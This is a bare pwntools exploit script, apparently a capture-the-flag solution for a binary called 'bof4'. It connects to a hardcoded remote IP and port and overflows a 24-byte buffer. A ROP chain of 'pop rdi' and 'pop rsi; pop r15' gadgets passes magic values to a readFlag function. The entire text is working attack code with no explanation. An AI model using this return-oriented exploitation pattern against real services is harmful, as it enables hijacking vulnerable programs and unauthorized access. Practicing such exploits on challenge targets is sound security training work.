#nc 13.214.30.13 10005

from pwn import *

host, port = "13.214.30.13",  "10005"

context.binary = binary = './bof4'
vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)

p = remote(host, port)

payload = b'A'*24
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(0xcabecabe)
payload += p64(vuln_rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
payload += p64(0xbecabeca)
payload += p64(0xcebaceba)
payload += p64(vuln_elf.symbols.readFlag)

p.recvline()
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
print(p.recvline())